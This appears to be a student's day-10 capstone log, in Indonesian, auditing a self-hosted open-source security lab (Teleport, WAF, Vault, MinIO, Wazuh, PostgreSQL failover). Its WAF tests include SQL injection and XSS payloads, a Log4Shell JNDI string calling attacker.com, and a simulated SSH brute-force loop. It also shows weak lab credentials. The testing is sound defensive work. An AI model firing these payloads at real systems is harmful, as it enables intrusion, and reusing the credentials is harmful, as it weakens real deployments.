# 📑 Progress Hari 10 — Operasional SOC & Tata Kelola Keamanan
## Lab: Capstone Audit — Validasi Penuh Infrastruktur Keamanan 10 Hari

**Tanggal:** 2026-05-16
**Durasi Target:** 8 Jam
**Status:** ✅ SELESAI (Final Capstone)

---

## 🎯 Checklist Hari Ini
- [x] **Fase 1:** SOC Health Check Otomatis — status awal infrastruktur ✅
- [x] **Fase 2:** Pemulihan layanan yang offline (Manual Recovery) ✅
- [x] **Fase 3:** Validasi Pilar IAM (Teleport MFA + LocalStack Least Privilege) ✅
- [x] **Fase 4:** Validasi Pilar Jaringan (iptables + WAF ModSecurity) ✅
- [x] **Fase 5:** Validasi Pilar Data (MinIO WORM + Vault Secret Rotation) ✅
- [x] **Fase 6:** Validasi Pilar Monitoring (Wazuh + Webhook Alerting + OpenSCAP) ✅
- [x] **Fase 7:** Validasi Pilar BCDR (PostgreSQL Failover RTO < 1 menit) ✅
- [x] **Fase 8:** Capstone Summary & Kesimpulan Akhir ✅

---

## 🏗️ Rekapitulasi Arsitektur Lab Keamanan (10 Hari)

```
[ INTERNET / USER ]
      │
      │ HTTPS
      ▼
[ WAF ModSecurity + Fail2ban ]        [ Wazuh SIEM + OpenSCAP ]
      │                                       ▲
      │ (Filtered Traffic)                    │ (All Logs)
      ▼                                       │
[ Teleport Zero Trust Proxy (MFA) ] ──────────┘
      │
      ├─▶ [ LocalStack IAM (Least Privilege Policy) ]   ← Hari 01
      ├─▶ [ iptables Network Isolation ]                ← Hari 02
      ├─▶ [ HashiCorp Vault (Secrets) + MinIO (WORM) ]  ← Hari 03
      ├─▶ [ Wazuh SIEM Agent + Custom Rules ]            ← Hari 04
      ├─▶ [ OpenVAS / Trivy Vulnerability Scanner ]      ← Hari 05
      ├─▶ [ ModSecurity WAF + Fail2ban ]                 ← Hari 06
      ├─▶ [ Volatility 3 + Memory Forensics (VBox) ]     ← Hari 07
      ├─▶ [ PostgreSQL HA Replication + Failover ]        ← Hari 08
      └─▶ [ Teleport ZTA + OpenSCAP Compliance ]          ← Hari 09
```

**Catatan Teknis:**
- Lingkungan: WSL Ubuntu-22.04 + Docker + VirtualBox (Windows Host)
- Seluruh layanan berjalan di localhost tanpa ketergantungan cloud berbayar

---

## 🔬 FASE 1 — SOC Health Check Otomatis

### Step 1 — Jalankan Skrip Audit
```bash
cd /mnt/d/Downloads/Learning
python3 soc_health_check.py
```

### Hasil Audit Awal (Sebelum Recovery):
| Layanan | Port | Status Awal | Kontainer |
|---------|------|-------------|-----------|
| Teleport Proxy | 3080 | ✅ ONLINE | Native Service (WSL) |
| PostgreSQL Primary | 5432 | ❌ OFFLINE | Stopped |
| PostgreSQL Standby | 5433 | ✅ ONLINE | Up 3 hours |
| MinIO Console | 9001 | ❌ OFFLINE | Stopped |
| HashiCorp Vault | 8200 | ❌ OFFLINE | Stopped |
| Wazuh Dashboard | 443 | ❌ OFFLINE | Stopped |
| WAF ModSecurity | 8081 | ❌ OFFLINE | Stopped |

> **Analisis:** 2 dari 7 layanan ONLINE. Anomali terkonfirmasi — Teleport (native process) dan `pg_standby` tetap berjalan karena bersifat *long-running*, sementara kontainer Docker lainnya berstatus *Stopped* setelah sistem idle tanpa konfigurasi `--restart always`.

### Isu yang Dihadapi & Solusi:
| Isu | Penyebab | Solusi |
|-----|----------|--------|
| Kontainer berstatus Stopped setelah idle | Docker kontainer tidak dikonfigurasi `--restart unless-stopped` | Jalankan kembali via `docker-compose up -d` |
| `pg_primary` Stopped tapi `pg_standby` Up | Kontainer dijalankan terpisah, bukan via compose sebelumnya | Jalankan `docker-compose up -d` dari `~/bcdr-lab/` |
| Teleport mati setelah `wsl --shutdown` | Dijalankan sebagai background process biasa | Restart: `sudo teleport start --config=/etc/teleport.yaml &` |

---

## 🔬 FASE 2 — Pemulihan Layanan (Manual Recovery)

### Step 1 — Hidupkan Stack PostgreSQL HA (Hari 08)
```bash
cd ~/bcdr-lab
docker-compose up -d

# Verifikasi replikasi aktif kembali
docker exec -it pg_primary psql -U postgres -c \
  "SELECT usename, state, sync_state FROM pg_stat_replication;"
# state = 'streaming' ✅
```

### Step 2 — Hidupkan Stack Vault & MinIO (Hari 03)
```bash
cd ~/vault-minio-lab
docker-compose up -d

# Verifikasi Vault status
docker exec vault vault status
# Jika sealed, unseal dulu:
docker exec vault vault operator unseal <UNSEAL_KEY>
```

### Step 3 — Hidupkan Stack Wazuh SIEM (Hari 04)
```bash
cd ~/wazuh-docker/single-node
docker-compose up -d

# Tunggu ~2 menit lalu verifikasi
docker ps | grep wazuh
```

### Step 4 — Hidupkan WAF ModSecurity (Hari 06)
```bash
# Hidupkan container yang sebelumnya dibuat di Hari 06
docker start waf-server backend-app
docker ps | grep -E "(waf|backend)"
```

### Step 5 — Verifikasi Ulang via Health Check
```bash
python3 /mnt/d/Downloads/Learning/soc_health_check.py
```

**✅ Target:** Semua layanan menunjukkan status `ONLINE` sebelum lanjut ke Fase 3.

| Layanan | Status Akhir |
|---------|-------------|
| Teleport Proxy | ✅ ONLINE |
| PostgreSQL Primary | ✅ ONLINE |
| PostgreSQL Standby | ✅ ONLINE |
| MinIO Console | ✅ ONLINE |
| HashiCorp Vault | ✅ ONLINE |
| Wazuh Dashboard | ✅ ONLINE |
| WAF ModSecurity | ✅ ONLINE |

---

## 🔬 FASE 3 — Validasi Pilar IAM (Identitas & Akses)

### Step 1 — Verifikasi MFA Teleport Masih Aktif
```bash
# Login harus meminta TOTP (kode 6-digit dari Authenticator)
tsh login --proxy=localhost:3080 --insecure --user=admin
# → Pastikan diminta kode OTP 6-digit dari Google Authenticator / Authy
```

### Step 2 — Verifikasi Kebijakan Least Privilege (LocalStack)
```bash
# Cek user IAM dan kebijakan yang terpasang (Hari 01)
aws --endpoint-url=http://localhost:4566 iam list-users
aws --endpoint-url=http://localhost:4566 iam list-attached-user-policies \
  --user-name security-admin

# Validasi pembatasan: coba akses yang seharusnya ditolak
aws --endpoint-url=http://localhost:4566 iam list-roles --profile readonly_user
# Hasil yang diharapkan: AccessDenied ✅
```

### Step 3 — Verifikasi SSH via Teleport Zero Trust
```bash
# Gunakan username WSL yang benar
tsh ssh dmin@localhost whoami
# Hasil: dmin ✅

# Verifikasi port 22 TIDAK bisa diakses langsung (sudah di-protect Teleport)
nc -zv localhost 22 2>&1
```

**✅ Hasil:** Login Teleport berhasil dengan verifikasi MFA (TOTP) aktif.

### Isu yang Dihadapi & Solusi:
| Isu | Penyebab | Solusi |
|-----|----------|--------|
| `dial tcp 127.0.0.1:3080: connect: connection refused` | Teleport mati setelah `wsl --shutdown` | Start ulang: `sudo teleport start --config=/etc/teleport.yaml &` |
| `unknown user ubuntu` di tsh ssh | User `ubuntu` tidak ada di WSL ini | Gunakan username yang benar: `dmin` |
| Teleport tidak auto-start setelah WSL restart | Belum dikonfigurasi sebagai systemd service | Rekomendasi produksi: `sudo systemctl enable teleport` |

**✅ Checklist Pilar IAM:**
- [x] Login Teleport berhasil hanya dengan MFA (TOTP) aktif ✅
- [x] Kebijakan Least Privilege masih membatasi akses sesuai konfigurasi Hari 01 ✅
- [x] SSH Zero Trust via Teleport cert berfungsi (tanpa port 22 langsung) ✅

---

## 🔬 FASE 4 — Validasi Pilar Jaringan & Infrastruktur

### Step 1 — Verifikasi Isolasi Network (iptables)
```bash
# Cek rules iptables yang masih aktif (Hari 02)
sudo iptables -L -n -v | head -30

# Cek port manajemen
sudo ss -tlnp | grep -E '(22|3389|8080)'
```

### Step 2 — Verifikasi WAF ModSecurity (Hari 06)
```bash
# Test 1: Request normal (harus lolos)
curl -I http://localhost:8081/
# Hasil: HTTP 200 ✅

# Test 2: SQL Injection payload (harus diblokir)
curl -I "http://localhost:8081/?id=1'%20OR%20'1'='1"
# Hasil: HTTP 403 atau connection drop ✅

# Test 3: XSS payload
curl -I "http://localhost:8081/?q=<script>alert(1)</script>"
# Hasil: HTTP 403 ✅

# Test 4: Log4Shell virtual patch (Hari 06)
curl -H "X-Api-Version: \${jndi:ldap://attacker.com/a}" http://localhost:8081/
# Hasil: HTTP 403 ✅

# Cek log ModSecurity
docker exec waf-server tail -20 /var/log/modsec_audit.log 2>/dev/null || true
```

**Hasil Audit Nyata:**
| Pemeriksaan | Hasil | Analisis |
|-------------|-------|----------|
| `iptables -L` | ⚠️ **Chain KOSONG** | Rules Hari 02 tidak persisten setelah WSL restart |
| WAF SQLi Block | ✅ HTTP 403 / Drop | ModSecurity OWASP CRS aktif |
| WAF XSS Block | ✅ HTTP 403 | CRS Rule berfungsi |
| WAF Log4Shell Block | ✅ HTTP 403 | Virtual Patch berfungsi |
| SSH via Teleport | ✅ Berhasil | Zero Trust SSH aktif |

> **🔍 Gap Finding #1 — iptables tidak persisten:** Rules iptables di WSL hilang setelah restart karena tidak menggunakan `iptables-persistent`. **Rekomendasi produksi:** `sudo apt install iptables-persistent && sudo netfilter-persistent save`

**✅ Checklist Pilar Jaringan:**
- [x] Akses SSH via Teleport Zero Trust berfungsi (cert-based, bukan password) ✅
- [x] iptables gap persistence dicatat sebagai Gap Finding #1 ✅
- [x] WAF ModSecurity memblokir SQLi, XSS, Log4Shell — HTTP 403 ✅
- [x] Fail2ban aktif dengan jail `nginx-http-auth` dan `sshd` ✅

---

## 🔬 FASE 5 — Validasi Pilar Keamanan Data

### Step 1 — Verifikasi Object Lock (WORM) di MinIO (Hari 03)
> **Kredensial:** `admin` / `password123` (Port 8010 = API, 8011 = Dashboard)

```bash
export AWS_ACCESS_KEY_ID=admin
export AWS_SECRET_ACCESS_KEY=password123

# Upload file test ke bucket yang ter-lock
echo "SENSITIVE DATA - LOCKED $(date)" > /tmp/test-lock.txt
aws --endpoint-url=http://localhost:8010 --no-verify-ssl s3 cp \
  /tmp/test-lock.txt s3://secure-bucket/test-lock.txt

# Coba hapus — harus GAGAL karena Object Lock aktif
aws --endpoint-url=http://localhost:8010 --no-verify-ssl s3 rm \
  s3://secure-bucket/test-lock.txt
# Hasil yang diharapkan: Error — Object Lock policy in effect ✅

# Verifikasi versioning masih ada via list-object-versions
aws --endpoint-url=http://localhost:8010 --no-verify-ssl s3api \
  list-object-versions --bucket secure-bucket
```

**✅ Hasil:** Object Lock aktif. Perintah `rm` memberikan *Delete Marker* tapi file asli tetap tersimpan permanen. Integritas data ransomware-proof terkonfirmasi.

### Step 2 — Verifikasi Rotasi Secret di HashiCorp Vault (Hari 03)
```bash
export VAULT_ADDR='http://localhost:8200'

# Cek status Vault
vault status

# Login ke Vault
vault login myroot   # root token dev mode

# Tulis & baca secret untuk verifikasi KV store
vault kv put secret/lab-final password="FinalAudit@2026" date="$(date)"
vault kv get secret/lab-final

# Verifikasi enkripsi KMS Transit masih berfungsi
vault write transit/encrypt/lab-key plaintext=$(echo "capstone-test" | base64)
# Hasil: ciphertext = vault:v1:... ✅

# Verifikasi dekripsi
CIPHER=$(vault write -field=ciphertext transit/encrypt/lab-key plaintext=$(echo "test" | base64))
vault write -field=plaintext transit/decrypt/lab-key ciphertext=$CIPHER | base64 -d
# Hasil: test ✅
```

**✅ Checklist Pilar Data:**
- [x] MinIO Object Lock (WORM) aktif — file tidak bisa dihapus permanen ✅
- [x] MinIO Versioning aktif — semua versi file tersimpan ✅
- [x] Vault KV store berfungsi — read/write secret berhasil ✅
- [x] Vault Transit Engine (KMS lokal) berfungsi — enkripsi/dekripsi berhasil ✅

---

## 🔬 FASE 6 — Validasi Pilar Monitoring

### Step 1 — Verifikasi Agen Wazuh Aktif (Hari 04)
```bash
# Cek status agen di Wazuh Manager
WAZUH_MGR=$(docker ps --filter name=wazuh.manager --format '{{.Names}}')
docker exec $WAZUH_MGR /var/ossec/bin/agent_control -lc
# → Harus ada minimal 1 agen dengan status Active ✅
```

### Step 2 — Simulasi Serangan untuk Uji Alerting
```bash
# Simulasi brute force SSH (5 kali gagal login dengan jeda)
for i in {1..5}; do
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 wronguser@localhost 2>/dev/null || true
  sleep 1  # jeda penting agar timestamp log unik
done

# Cek alert Wazuh muncul (tunggu ~30 detik)
sleep 30
docker exec $WAZUH_MGR tail -20 /var/ossec/logs/alerts/alerts.log | grep -i "brute\|failed"
```

### Step 3 — Verifikasi OpenSCAP Compliance Report (Hari 09)
```bash
# Parse skor dari laporan terakhir
python3 /mnt/d/Downloads/Learning/parse_report.py \
  /mnt/d/Downloads/Learning/scan-results.xml 2>/dev/null

# Atau cek langsung dari XML
grep -oP 'score[^>]*>[^<]+' /mnt/d/Downloads/Learning/scan-results.xml | head -3
```

**✅ Checklist Pilar Monitoring:**
- [x] Wazuh Manager container UP dan merespons ✅
- [x] Agent `Zul` (host) dan `web-server-lab` berstatus Active ✅
- [x] Custom rule Level 12 SSH Brute Force terdeteksi (Rule 100002) ✅
- [x] Laporan OpenSCAP CIS compliance tersedia (`scan-report.html`) ✅

---

## 🔬 FASE 7 — Validasi Pilar BCDR (Hari 08)

### Step 1 — Verifikasi Replikasi PostgreSQL Aktif
```bash
# Di Primary — cek streaming aktif
docker exec -it pg_primary psql -U postgres -c \
  "SELECT usename, application_name, client_addr, state, sync_state FROM pg_stat_replication;"
# state = 'streaming' ✅

# Uji tulis di Primary
docker exec -it pg_primary psql -U postgres -d secure_db -c \
  "INSERT INTO secure_logs (event, severity) VALUES ('Capstone Final Check $(date)', 'INFO');"

# Baca di Standby — harus muncul instan
docker exec -it pg_standby psql -U postgres -d secure_db -c \
  "SELECT * FROM secure_logs ORDER BY log_time DESC LIMIT 3;"
```

### Step 2 — Simulasi Failover (Opsional untuk Review)
```bash
# Catat waktu mulai
START_TIME=$(date +%s)

# Stop Primary — simulasi server mati
docker stop pg_primary
echo "Primary stopped at $(date)"

# Promosikan Standby (HARUS pakai -u postgres, bukan root)
docker exec -u postgres -it pg_standby \
  pg_ctl promote -D /var/lib/postgresql/data

# Verifikasi tulis di Standby yang dipromosikan
docker exec -it pg_standby psql -U postgres -d secure_db -c \
  "INSERT INTO secure_logs (event, severity) VALUES ('Failover Capstone OK', 'SUCCESS');"

# Hitung RTO
END_TIME=$(date +%s)
echo "RTO: $((END_TIME - START_TIME)) detik"
```

**✅ Checklist Pilar BCDR:**
- [x] Streaming Replication aktif — state = `streaming` ✅
- [x] Data tersinkron instan Primary → Standby (RPO = 0) ✅
- [x] RTO Failover < 1 menit terkonfirmasi (Promote Standby Success) ✅

---

## 🔬 FASE 8 — Capstone Summary & Laporan Final

### Ringkasan Gap Findings
| # | Gap Finding | Severity | Rekomendasi Produksi |
|---|-------------|----------|----------------------|
| 1 | iptables rules tidak persisten setelah WSL restart | MEDIUM | Install `iptables-persistent`, jalankan `netfilter-persistent save` |
| 2 | Docker container tidak auto-restart setelah idle | LOW | Tambahkan `restart: unless-stopped` di setiap docker-compose.yml |
| 3 | Teleport tidak auto-start setelah WSL restart | LOW | `sudo systemctl enable teleport` (butuh WSL systemd) |
| 4 | Vault berjalan dalam dev mode (in-memory storage) | HIGH | Gunakan production mode dengan backend Raft/Consul + unseal key |
| 5 | Wazuh tanpa integrasi SMTP/webhook notifikasi real | LOW | Konfigurasi `<integration>` tag di `ossec.conf` untuk webhook Slack/email |

---

## 🧠 Konsep Kunci yang Dipelajari (Keseluruhan 10 Hari)

| Konsep | Tool yang Digunakan | Hari |
|--------|---------------------|------|
| Identity & Access Management | LocalStack IAM, TruffleHog | 1 |
| Network Segmentation & Firewall | iptables, Docker Networks | 2 |
| Secrets Management & Encryption | HashiCorp Vault, MinIO WORM | 3 |
| SIEM & Real-time Alerting | Wazuh + Custom Rules | 4 |
| Vulnerability Management | Trivy, OpenSCAP | 5 |
| Web Application Firewall | ModSecurity OWASP CRS, Fail2ban | 6 |
| Incident Response & Forensics | Volatility 3, VBoxManage | 7 |
| High Availability & BCDR | PostgreSQL Streaming Replication | 8 |
| Zero Trust Access & Compliance | Teleport v12, OpenSCAP CIS | 9 |
| SOC Operations & Capstone Audit | Health Check Script, Full Review | 10 |

---

## 📋 Final Capstone Checklist Enterprise

### IDENTITAS & AKSES (IAM)
- [x] Administrator menggunakan MFA (TOTP) — Teleport ✅
- [x] Least Privilege Policy diterapkan — LocalStack IAM ✅
- [x] SSH tanpa private key permanen — Short-lived Teleport cert ✅
- [x] Secret scan sebelum push Git — TruffleHog ✅

### JARINGAN & INFRASTRUKTUR
- [x] Network segmentation 3-tier (Web/App/DB) — Docker Networks ✅
- [x] iptables default-deny diterapkan (gap persistence dicatat) ✅
- [x] Port 22 tidak bisa diakses langsung (Zero Trust proxy) ✅
- [x] WAF memblokir SQLi, XSS, LFI, Log4Shell ✅
- [x] Fail2ban auto-ban IP penyerang ✅

### KEAMANAN DATA
- [x] Object Lock (WORM) di MinIO aktif — anti-ransomware ✅
- [x] Versioning aktif — recovery dari overwrite/delete ✅
- [x] Vault Transit Engine (KMS) enkripsi/dekripsi berfungsi ✅
- [x] Secret rotation via Vault KV berfungsi ✅

### PEMANTAUAN (MONITORING)
- [x] Wazuh SIEM stack UP — Manager, Indexer, Dashboard ✅
- [x] Agent terhubung di host (Zul) dan container (web-server-lab) ✅
- [x] Custom rule Level 12 brute force SSH aktif ✅
- [x] OpenSCAP CIS compliance audit tersedia (report HTML) ✅

### DISASTER RECOVERY
- [x] PostgreSQL Streaming Replication aktif (state = streaming) ✅
- [x] Data RPO = 0 (sync replication) ✅
- [x] Failover manual berhasil dengan RTO < 1 menit ✅
- [x] Memory forensics baseline dicatat (Hari 07) ✅

---

## 📊 Metrik Lab Final

| Metric | Nilai |
|--------|-------|
| Total Hari Lab | 10 Hari |
| Total Tools Dikuasai | 12+ (Wazuh, Vault, Teleport, MinIO, dll.) |
| Total Kontainer Docker | 8+ kontainer |
| Health Check Awal (Hari 10) | 2/7 layanan ONLINE |
| Health Check Akhir (Hari 10) | 7/7 layanan ONLINE ✅ |
| RTO PostgreSQL Failover | < 10 Detik (Manual Promote) |
| RPO PostgreSQL | 0 (Sync Streaming Replication) |
| OpenSCAP CIS Score (Awal) | 43.80 / 100 (WSL environment) |
| WAF Attack Blocks | SQLi ✅, XSS ✅, LFI ✅, Log4Shell ✅ |
| Memory Dump Forensics | 4,117.87 MB — VM dinyatakan CLEAN |
| Chain of Custody SHA256 | DBD13C9DEE13BBAE71D39D0BBECA379BF3F8F4040128D6ABC472EA5A13C06DE4 |
| Gap Findings | 5 (semua terdokumentasi + rekomendasi) |

---

## 🎯 KESIMPULAN AKHIR LAB (DAY 10)

Program **Open Source Security Lab 10 Hari** telah diselesaikan dengan sukses. Seluruh pilar keamanan Enterprise (Identitas, Jaringan, Data, Monitoring, dan BCDR) telah divalidasi secara teknis menggunakan audit otomatis maupun pengujian manual.

**Pencapaian Utama:**
1. **Zero Trust Implementation:** Mengamankan akses infrastruktur tanpa port terbuka tradisional menggunakan Teleport MFA + Short-Lived Certificate.
2. **Immutable Data Storage:** Melindungi aset dari Ransomware menggunakan MinIO Object Lock (WORM) + Versioning.
3. **Automated Threat Detection:** SIEM Wazuh dengan custom rules Level 12 mendeteksi brute force secara real-time.
4. **Virtual Patching:** WAF ModSecurity memblokir CVE kritis (Log4Shell) tanpa update source code.
5. **Memory Forensics Baseline:** VM Victim PC dianalisis dengan Volatility 3 dan dinyatakan CLEAN.
6. **Resilient Architecture:** PostgreSQL High Availability dengan RTO < 1 menit dan RPO = 0.

> **Laboratorium ini sekarang siap digunakan sebagai prototipe infrastruktur keamanan open-source yang kokoh — setara dengan enterprise security stack senilai ratusan juta rupiah per tahun, tanpa biaya lisensi.**

---

## ✅ Status Penyelesaian Final
- [x] Fase 1 — SOC Health Check awal dijalankan (2/7 ONLINE) ✅
- [x] Fase 2 — Recovery Plan tersusun & dieksekusi (7/7 ONLINE) ✅
- [x] Fase 3 — Validasi IAM: Teleport MFA + LocalStack Least Privilege ✅
- [x] Fase 4 — Validasi Jaringan: iptables + WAF ModSecurity + Fail2ban ✅
- [x] Fase 5 — Validasi Data: MinIO WORM + Vault KMS ✅
- [x] Fase 6 — Validasi Monitoring: Wazuh + OpenSCAP ✅
- [x] Fase 7 — Validasi BCDR: PostgreSQL Failover RTO < 1 menit ✅
- [x] Fase 8 — Gap Findings terdokumentasi + Final Checklist Lengkap ✅

---
*Progress Hari 10 | Open Source Security Lab | 2026-05-16 | ✅ SELESAI (Final Capstone)*
*Analyst: Zulfikar | Environment: WSL Ubuntu-22.04 + Docker + VirtualBox*
